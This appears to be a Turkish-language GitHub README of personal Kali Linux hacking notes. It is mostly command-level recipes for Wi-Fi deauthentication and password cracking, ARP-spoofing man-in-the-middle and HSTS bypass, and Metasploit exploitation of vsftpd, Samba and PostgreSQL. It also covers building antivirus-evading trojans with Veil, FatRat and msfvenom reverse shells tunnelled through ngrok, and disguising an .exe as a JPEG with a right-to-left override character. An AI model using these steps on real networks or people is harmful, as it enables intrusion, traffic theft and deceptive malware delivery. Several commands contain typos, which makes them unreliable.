# Cyber Security
- [1-VPN DNS MAC](#1-VPN-DNS-MAC)
  - [VPN Book](#VPN-Book)
  - [Kali DNS Ayarları Değiştirme](#Kali-DNS-Ayarları-Değiştirme)
  - [DNS Sızıntı Testi](#DNS-Sızıntı-Testi)
  - [MAC Adresi Değiştirme](#MAC-Adresi-Değiştirme)
- [2-Monitör Mod ve Manage Mod](#2-Monitör-Mod-ve-Manage-Mod)
- [3-Çevredeki Modemleri Bulma](#3-Çevredeki-Modemleri-Bulma)
- [4-Deauth Saldırısı Yapma](#4-Deauth-Saldırısı-Yapma)
  - [Ağdaki Cihazların MAC Adreslerini Görme](#Ağdaki-Cihazların-MAC-Adreslerini-Görme)
  - [Ağdaki Cihazlara Deauth Saldırısı Yapma](#Ağdaki-Cihazlara-Deauth-Saldırısı-Yapma)
    - [Ağdaki Bütün Cihazlara Saldırı](#Ağdaki-Bütün-Cihazlara-Saldırı)
    - [Ağdaki Belirli Cihaza Saldırı](#Ağdaki-Belirli-Cihaza-Saldırı)
- [5-Wifi Parola Kırma](#5-Wifi-Parola-Kırma)
  - [WEB Parola Kırma](#WEB-Parola-Kırma)
  - [VPA ve VPA2 Parola Kırma](#VPA-ve-VPA2-Parola-Kırma)
    - [Handshake Yakalama](#Handshake-Yakalama)
    - [Wordlist Oluşturma](#Wordlist-Oluşturma)
    - [Parola Kırma](#Parola-Kırma)
    - [Brute Force Nedir](#Brute-Force-Nedir)
- [6-IP ve MAC Adreslerini Eşleme](#IP-ve-MAC-Adreslerini-Eşleme)
  - [Netdiscover](#Netdiscover)
  - [nmap](#nmap)
- [7-Man in the Middle Saldırısı](#7-Man-in-the-Middle-Saldırısı)
  - [Arpspoof](#Arpspoof)
  - [Wireshark ile MITM Saldırısı İzleme](#Wireshark-ile-MITM-Saldırısı-İzleme)
  - [Bettercap](#Bettercap)
    - [Bettercap ile Dinleme Yapma](#Bettercap-ile-Dinleme-Yapma)
  - [HTST](#HTST)
  - [HTTPS to HTTP](#HTTPS-to-HTTP)
  - [Windows Bilgisayarımıza MITM Saldırısı Var Mı](#Windows-Bilgisayarımıza-MITM-Saldırısı-Var-Mı)
- [8-NMAP](#NMAP)
  - [NMAP ile Açık Arama](#NMAP-ile-Açık-Arama)
    - [NMAP Komutları](#NMAP-Komutları)
  - [FTP](#FTP)
    - [msfconsole ile Açığa Giriş](#msfconsole-ile-Açığa-Giriş)
    - [Giriş Yaptıktan Sonra](#Giriş-Yaptıktan-Sonra)
  - [TELNET](#TELNET)
  - [SSH](#SSH)
  - [SAMBA](#SAMBA)
  - [POSTGRESQL METERPRETER](#POSTGRESQL-METERPRETER)
- [9-Trojan Backdoor Oluşturma](#9-Trojan-Backdoor-Oluşturma)
  - [Veil](#Veil)
  - [Multihandler Backdoor Dinleme](#Multihandler-Backdoor-Dinleme)
  - [Fatrat](#Fatrat)
    - [Dinlemek içim](#Dinlemek-İçin)
  - [Msfvenom](#Msfvenom)
  - [Ngrok](#Ngrok)
    - [Kendi IP Adresimizi Kullanmadan Trojan Oluşturma](#Kendi-IP-Adresimizi-Kullanmadan-Trojan-Oluşturma)
    - [Hata](#Hata)
  - [Trojan ile Görsel Birleştirme](#Trojan-ile-Görsel-Birleştirme)
    - [Trojanin Uzantısını Değiştirme](#Trojanin-Uzantısını-Değiştirme)
- [10-Sosyal Mühendislik](#Sosyal-Mühendislik)
  - [Maltego](#Maltego)
- [11
-


# 1-VPN DNS MAC 

VPN (Virtual Personal Network)

DNS (Domain Name Server)

```iwconfig``` -> bağlı olduğumuz wifi ile ilgili bilgileri detaylı olarak gösterir

### VPN Book

```wwww.vpnbook.com``` kali içine VPN indirmemizi sağlar

```openvpn vpnadı``` -> vpn dosyasını açar

```service network-manager restart``` -> internet sunucularını resetler

### Kali DNS Ayarları Değiştirme

```nano /etc/dhcp/dhclient.conf``` içindeki ```prepentt name servers ```değiştirmemiz gerekir

Google DNS-> 8.8.8.8 ya da 8.4.4.8
Cloudflare -> 1.1.1.1. ya da 1.0.0.1

### DNS Sızıntı Testi 

www..dnsleaktest.com

### MAC Adresi Değiştirme

> ### 1.Yöntem

```macchanger```ile mac adresimizi değiştirebiliriz ya da

> ### 2.Yöntem
```
ifconfig wlan0 down

ifconfig wlan hw ether XX:XX:XX:XX:XX:XX  İstediğimiz MAC adresini yapmamızı sağlar

ifconfig wlan0 up
```

# 2-Monitör Mod ve Manage Mod

Wifi adaptörümüzü bilgisayarımıza bağlıyoruz, daha sonra kalimizi monitör moda almamız gerekiyor

> ### 1.Yöntem

```airmon -ng start wlan0```-> interneti monitör moda alır !! Monitör modda iken internete bağlanamayız sadece bağlı olmadığımız ağların bilgilerini elde edebiliriz

```airmon -ng stop wlan0``` -> interneti manage moda alır 

> ### 2.Yöntem
```
ifconfig wlan0 down

ifconfig wlan0 mode monitor

ifconfig wlan0 up
```

# 3-Çevredeki Modemleri Bulma

```airopdump -ng wlan0mon``` -> Çevredeki Modemleri Bulur

```CTRL + X ile işlemi sonlandırırız```

```
* pwr -> - Olarak ne kadar büyükse modem bize o kadar yakındır
* Data -> O ağa kaç cihazın bağlı olduğunu gösterir
* CH -> Hangi kanalda olduğunu gösterir
* ENC -> Şifreleme işlemi bilgisi
```

# 4-Deauth Saldırısı Yapma

### Ağdaki Cihazların MAC Adreslerini Görme
```
airodump -ng --channel X (kanal numarası) --bssid XX:XX:XX:XX:XX:XX (MAC adresi) --write airodumptest (Sonuçları yazdıracağımız 
dosya adı) wlan0
```
### Ağdaki Cihazlara Deauth Saldırısı Yapma

> ### Ağdaki Bütün Cihazlara Saldırı
```
aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX wlan0mon
```

> ### Ağdaki Belirli Cihaza Saldırı
```
aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
```

```
* A: Gönderilecek paket sayısı, sayı büyüdükçe ağda düşme süresi artar
* -a:  Ağın MAC adresi
* -c:  Saldırı Yapılacak Cihazın MAC adresi
```

# 5-Wifi Parola Kırma 

### WEB Parola Kırma 

Fakeauth saldırısı yapıyoruz ağdan birisi düşüp tekrar bağlanırsa handshake yakalamamız kolaylaşır

```aireplay -ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h YY:YY:YY:YY:YY:YY wlan0mon```

```aireplay -ng --arpreplay -b XX:XX:XX:XX:XX:xX -h YY:YY:YY:YY:YY:YY wlan0mon``` belirlenen cihaza IV yollamamızı sağlar

Eğer Ağda Yeteri Kadar Cihaz Yoksa
* fakeauuth yolla
* arpreplay çalıştır
* aircrack -ng çalıştır

```aircrack -ng airodumptest.cap (Tarama Sırasında Yazdırdığımız Dosya)``` 

```192.168.1.1 modeminizin ara yüzüne giriş yaparsınız```

### VPA ve VPA2 Parola Kırma

www.gpuhash.me  -> içine yakalanan handshake'i atarak online olarak şifre kırma işlemi uygulanabilir

### Handshake Yakalama

``` airodump -ng --channel X --bssid XX:XX:XX:XX:XX:XX --write handshake-file wlan0mon```

```
channel: Ağın çalıştığı kanal
bssid: Ağın MAC adresi
write: Yakalanan handshake'in nereye kayıt edileceği
```

**! Kolayca handshake yakalamak için ufak paketli deauth saldırı yapılabilir**

### Wordlist Oluşturma

``` crunch 6 10 0123456789abcdefgh -o passwrd.txt``` 
içinde "0123456789abcdefgh" geçen min 6 maks 10 haneli şifre kombinasyonlarının olduğu passwrd isimli wordlist oluşturur

```filesystem/usr/shake/wordlist``` içinde en çok kullanılan şifrelerin bulunduğu wordlist

```cat wordlist.txt``` wordlistin içindeki şifreleri görmemizi sağlar

### Parola Kırma

``` aircrack -ng handshake-file.cap -w passwrd.txt``` handshake dosyasını ve worlisti kullanarak brute froce saldırısı yapar

> ### Brute Force Nedir

Brute Force mümkün olan bütün şifre kombinasyonlarını denemektir. Bu yöntemi kullanarak şifreyi kesin buluruz fakat bu işlem saatlerce, günlerce, aylarca, hatta yılllarca sürebilir

![image](https://user-images.githubusercontent.com/85068070/216357440-ba01b31d-76d1-4f35-b7ba-47da04ead32f.png)

# 6-IP ve MAC Adreslerini Eşleme

### Netdiscover

```netdiscover -i eth0 -r XX:XX:XX/24 -c 10``` 

* -r: eth0'daki inet'in ilk 6 hanesi
* -c: deneme sayısı

### nmap

``` nmap XX:XX.XX.0/24 ```  0 ve 24 yani tüm aralıktaki IPlere istek atar, IP ve MAC adreslerini eşleştirip ekstra bilgi verir. Atılan istekleri
karşı taraf görebilir

# 7-Man in the Middle Saldırısı

### Arpspoof

İlk olarak **arpspoof**'u indirmemiz gerekiyor onun için; ```apt install dsniff```

```arpspoof -i eth0 -t XX:XX:XX:XX YY:YY:YY:YY```  target'a kendimizi modem olarak tanıtıyoruz
```
-t: Kurban IP

YY:YY:YY:YY : Kendi IP adresimiz 
```
Daha sonra ```arpspoof -i eth0 -t YY:YY:YY:YY XX:XX:XX:XX``` yazarak modem'e kendimizi target olarak tanıtıyoruz
```
-t: Kendi IP'miz
XX:XX:XX:XX : Kurban IP
```
``` echo 1 > /proc/sys/net/ipv4/ip-forward``` IP forwardlamayı etkinleştirerek **hedef pc'nin** ağdan kopmamasını sağlıyoruz

### Wireshark ile MITM Saldırısı İzleme

Wireshark kullanarak ağ izleme yapılabilir ve ARP isteği var mı incelenebilir eğer işlemlerin yanında **duplicate use of..** yazıyorsa MITM saldırısı vardır. **http** olan websitesi içine girilen bilgiler (e.g. Login bilgileri) Wireshark içinden incelenerek görülebilir. **https** olan websitelerinde bu bilgiler şifreli olarak taşındığı için açık şekilde okunamaz

  ![wireshark görsel](https://github.com/ahmetnuysal/Cyber-Security/blob/6880076de41a97a03edb4fe36e75dfce1e58ac9a/MITM/WhatsApp%20Image%202022-08-16%20at%2019.17.24.jpeg)

### Bettercap 

* Terminal'e ```bettercap -iface eth0``` yazarak bettercap'i açıyoruz
* bettercap çalıştırdıktan sonra ```help``` yazarsak içinde nelerin çalıştığını görebiliriz

* ```net.prope on``` Ağdaki cihazların IP adresini, MAC adreslerini ve cihaz isimlerini gösterir
* ```net.show``` Toplanan bilgileri özet olarak gösterir


Bettercap İçinde

* ```arp.ban on``` hedef PC'ye deauth saldırısı yapar
* ```arp.spoof.fullduplex``` Hem modeme hem PC'ye MITM saldırısı yapar
* ```arp.spoof.internal``` True olursa, PC'ler arasındaki bağlantıları gösterir
* ```arp.spoof.skip_restore``` True olursa, Saldırı sonrası doğru verileri göndermez
* ```arp.spoof.targets 192.168.123.123``` "," koyarak birden fazla PC'ye MITM saldırısı yapabiliriz
* ```arp.spoof.whitelist``` Belirtilen IP adreslerine sahip cihazlara saldırı yapmaz

Parametreleri değiştirmek için: ```set``` komutunu kullanıyoruz. ```(e.g. arp.spoof.fullduplex true)``` 

> ### Bettercap ile Dinleme Yapma

* ```net.sniff on``` Hedef PC'yi dinlemeye başlar

### HTST

```htst``` ne olursa olsun o siteyi https olarak açmaya zorluyor

### HTTPS to HTTP

```hstshijack.cap``` dosyasında ```com``` uzantıları ```corn``` olarak değiştiriyoruz

> ### Windows Bilgisayarımıza MITM Saldırısı Var Mı 

Windows arama yerine ```cmd``` yazarak terminali açıyoruz ve ```arp -a``` yazarak modem ile aynı MAC adresine sahip birisi var mı görüyoruz

# 8- NMAP

### NMAP ile Açık Arama

```nmap -v -sS -A -T4 XX:XX:XX:XX:XX (Target IP)```  Taranan adresteki açıkları gösterir

> ### NMAP Komutları
```
-A: Farklı işletim sistemi versiyon vs verir.
-sn: Port taraması yapma anlamına gelir.
-n: DNS Çözümlemesi yapma anlamına gelir.
-v, -vv, -vvv: Ekrana gösterilecek detayları arttırır.
-F: Daha hızlı tarama yapar. Daha az sonuç bulur.
-sS:Syn Taraması Yapar
--reason: Bulduğu bir sonucun sebebini gösterir.
--open: Sadece açık Portları gösterir.
-p-: Bir IP üzerinde bulunması muhteme 65535 portun hepsini tarar.
-sV: Açık portta çalışan servisin ne olduğunu bulmaya çalışır.
-sC ile birlikte kullanılırsa işe yarar.
-sC: -sV ile versiyon tespiti yapılırken nmap scriptlerini kullanır.
-p: Sadece bu parametreden sonra belirtilen portları tarar.
-o: İşletim sistemi bilgilerini gösterir.
```
### FTP

```ftp 192.168.123.123``` çalıştırıyoruz, kullanıcı adı ve şifre yerine "anonymous" yazıyoruz. ftp açığına bağlandıktan sonra ```put dosyaadı``` ile dosya ekleyebiliriz. Google'a nmap'te bulunan ```vsftpd A.B.C (vsftpd 2.3.4) exploit``` yazarak gerekli komutlara ulaşabiliriz

> ### msfconsole ile Açığa Giriş

1. ```msfconsole``` çalıştırıyoruz
2. ```msf > use exploit/unix/ftp/usftp_234_backdoor```
3. ```show targets```
4. ```set targets 192.168.123.123``` hedef IP
5. ```show options```
6. ```set RHOST 192.168.123.123``` hedef IP
7. ```set RPORT 21``` port'u değiştiriyoruz
8. ```exploit -j -z``` dinleyeme başlıyoruz (```-j -z``` dersek dinlemeyi arka planda yapar)
9. ```sessions -l``` açık olan portları görürüz
10. ```session 1``` 1. session açık olduğu için o porttan giriş yapar

> ### Giriş Yaptıktan Sonra

1. ```uname -a``` içinde olduğumuz sistemin adını verir
2. ```ls, pwd``` gibi komutlarla sistemde gezinebiliriz
3. ```background``` ile sistemden çıkış yaparız

### TELNET

Telnet SSH'dan daha güvensizdir. ```telnet 192.168.123.123``` çalıştırarak giriş yapıp ```wireshark``` üzerinden şifre ve kullanıcı adını rahatça görebiliriz

### SSH

```sshmsfadmin@192.168.123.123``` çalıştırarak giriş yapıp ```wireshark``` üzerinden şifre ve kullanıcı adını **şifrelenmiş** olarak görürüz

### SAMBA

Samba linux sunucuları ile windows sunucularını birbirine bağlar. Şirketlerdeki PC, yazıcı vb şeyleri birbirine bağlar

1. Samba Numarasını ```(samba smbd 3.x-4.x) exploit``` ile google'da ararız
2. ```msfconsole``` açarız
3. Google üzerinde çıkan komutları yazıyoruz
4. ```LHOST``` bizim IP adresimiz
5. ```exploit -j -z``` dinleyeme başlıyoruz ```-j -z``` dersek dinlemeyi arka planda yapar
6. ```sessions -l``` açık olan portları görürüz
7. ```session 1``` 1. session açık olduğu için o porttan giriş yapar


### POSTGRESQL METERPRETER

1. Postgresql kodunu google'da exploit olarak aratıyoruz
2. ```msfconsole``` açıyoruz
3. Google üzerinden çıkan kodları çalıştırıyoruz
4. ```show options``` çalıştırdığımızda çıkan bilgiler içinde default password'u görürüz
5. ```LHOST``` ve ```RHOST``` ayarlarını değiştriiyoruz
6. ```exploit -j -z``` dinleyeme başlıyoruz ```-j -z``` dersek dinlemeyi arka planda yapar
7. ```sessions -l``` açık olan portları görürüz
8  ```session 1``` 1. session açık olduğu için o porttan giriş yapar

# 9- Trojan Backdoor Oluşturma

### Veil

1. Veil opt içinde kurulu olduğu için ```/opt``` içine giriyoruz
2.```python3 veil.py``` 
3.```>>use 1``` 
4.```>>list``` diyerek farklı dillerde ve amaçlarda backdoor seçeneklerini listeleriz
5.```LPORT, LHOST, sleep, processors``` gibi ayarları değiştirip ```generate``` diyerek trojanı oluşturmaya başlarız
6. Oluşturulan trojan'ın konumunu görürüz (var/lib/veil/output/complied) 
7. Oluşturduğumuz trojan'ı ```antiscan.me``` gibi sitelerde test edebiliriz

### Multihandler Backdoor Dinleme

1.```msfconsole``` 
2.```use exploit/multi/handler``` diyerek payload tanımlıyoruz
3.```set patload windows/meterpreter/reverse_http```  (trojanın oluşturulma tipine göre değişiklik gösterebilir)
4.```LHOST ve LPORT```'u değiştiriyoruz
5.```exploit -j -z``` ile dinlemeye başlıyoruz 
6. Trojan çalıştığında ```sessions -l``` ve ```session 1``` ile backdoor'dan giriş yapıyoruz

```service apache2 start/stop``` Kendi IP'mizin Web servisini aktif hale getirir

### Fatrat

1.```fatrat``` ile framework'ü açıyoruz
2. Yapmak istediğimiz işleme göre seçim yapıyoruz trojan oluşturmak için ```[02] Create Fud Backdoor with Fudwin 1.0``` seçiyoruz
3. Trojanı yapıcağımız tool'u seçiyoruz ```[1] Hızlı [2] Yavaş fakat diğerine göre daha güçlü```
4.```LHOST, LPORT``` giriyoruz
5. Trojan adını seçiyoruz
6. ```32bit/64bit``` seçiyoruz
7. Trojan'ı oluşturuyoruz ve dinliyoruz

> ### Dinlemek için

1.```msfconsole``` 
2.```use exploit/multi/handler``` diyerek payload tanımlıyoruz
3.```set patload windows/meterpreter/reverse_tcp```  (trojanın oluşturulma tipine göre değişiklik gösterebilir) 
4.```LHOST ve LPORT```'u değiştiriyoruz
5.```exploit -j -z``` ile dinlemeye başlıyoruz 
6. Trojan çalıştığında ```sessions -l``` ve ```session 1``` ile backdoor'dan giriş yapıyoruz

### Msfvenom


```msfvenom -p windows/meterpreter/reverse_tcp -a X86 --platform windows lhost=0.tcp... lport=12345 -f exe -o /root/newbackdoor.exe```
```
-p: payload
-a: bit sayısı
--platform: hangi platformda çalışacağı 
lhost: ngrok'dan kopyaladığımız IP
lport: ngrok'dan kopyaladığımız PORT
-f: dosya uzantısı 
-o: trojan'in kaydedileceği konum
```

### Ngrok

> ### Kendi IP Adresimizi Kullanmadan Trojan Oluşturma

1. ```ngrok.com``` sitesine gidiyoruz, üye oluyoruz ve profilimizde bize ait olan token'ı kopyalıyoruz
2. Terminale giriyoruz ve ```.ngrok config add-authtoken 2BA7...Xoh``` çalıştırıyoruz 
3. ```./ngrok``` çalıştırarak ngrok'u açıyoruz ```./ngrok help``` ile menüyü açabiliriz
4. ```./ngrok tcp 4242``` çalıştırarak 4242 portunda tünel servisini açıyoruz
5. ```forwarding``` kısmındaki ```IP``` ve ```PORT```'u kaydediyoruz

> ### Hata 

```/opt/veil/tools/evasion/tool.py``` içindeki kodda ```!Error!You did not provide a valid IP``` kodunu siliyoruz(421-424.satır)
```selected_payload__ ``` kısmını if ile alt alta getirip ```if helpes validate_ip(value)``` kodunu siliyoruz

### Trojan ile Görsel Birleştirme

1. İlk olarak görselimizi (.jpeg) seçip google üzerinden uzantısını ```.ico```'ya çeviriyoruz 
2. ```Veil``` kullanarak trojan'i oluşturuyoruz
3. İndirdiğimiz ```.ico``` uzantılı görsel ile trojan'i aynı dosya içine atıyoruz
4. Dosya içine girip ```python3 trojan_factory.py -f http://192.168.123.456/backdoors/andorid.jpeg -e http://192.168.123.456/backdoors/mynewpayload.exe -o /opt/trojanfactory/newtest.exe ; http://192.168.123.456/backdoors/android.ico``` çalıştırıyoruz
```
-f: .jpeg dosyasının konumu
-e: trojan'in konumu
-o: .ico'nun konumu 
```

> ###  Trojan Uzantısını Değiştirme

1. ```apt-get install gnome-characters``` karakter paketini indiriyoruz
2. İndirdiğimiz framework'ü açıyoruz ve arama yerine ```right-to-right``` yazıp çıkan şeyi kopyalıyoruz
3. ```.exe``` dosyamızın sonunda ```gepj.exe``` yazıyoruz
3. ```gepj.exe``` kısımını seçip ```ctrl+v``` yapıyoruz ve dosya uzantısı ```.jpeg``` olarak gözüküyor

```right-to-left``` characters kısmında yoksa google'a ```unicode-table``` yazıp çıkan siteden kopyalabiliriz ```U+202E```

# 10-Sosyal Mühendislik

### Maltego

```maltego``` kali içinde yüklü framework 

![maltego](https://github.com/ahmetnuysal/Cyber-Security/blob/b68de2a49b710eb320f11e01a9013021663d0dc3/WhatsApp%20Image%202022-08-17%20at%2016.29.29.jpeg)

Yeni Sayfa Açmak 

![maltego yeni sayfa](https://github.com/ahmetnuysal/Cyber-Security/blob/b68de2a49b710eb320f11e01a9013021663d0dc3/WhatsApp%20Image%202022-08-17%20at%2016.28.13.jpeg) 

Sol Taraftan Ne Tür Arama Yapıcağımızı Seçiyoruz

![sosyal mühendislik](https://github.com/ahmetnuysal/Cyber-Security/blob/75e15440d30a5e6fd7a7910cafc44beec6b2496c/WhatsApp%20Image%202022-08-17%20at%2016.34.43.jpeg)

Sağ Click Yaparak Hangi Tür Bilgileri Edinebileceğimizi Görebiliriz Ya Da Tüm Bilgileri Görebiliriz

![run](https://github.com/ahmetnuysal/Cyber-Security/blob/9b17f8f1f08083fe3766213e94b20e62b1fa1aff/WhatsApp%20Image%202022-08-17%20at%2016.38.10.jpeg)

Ve toplanan bilgileri görürüz  

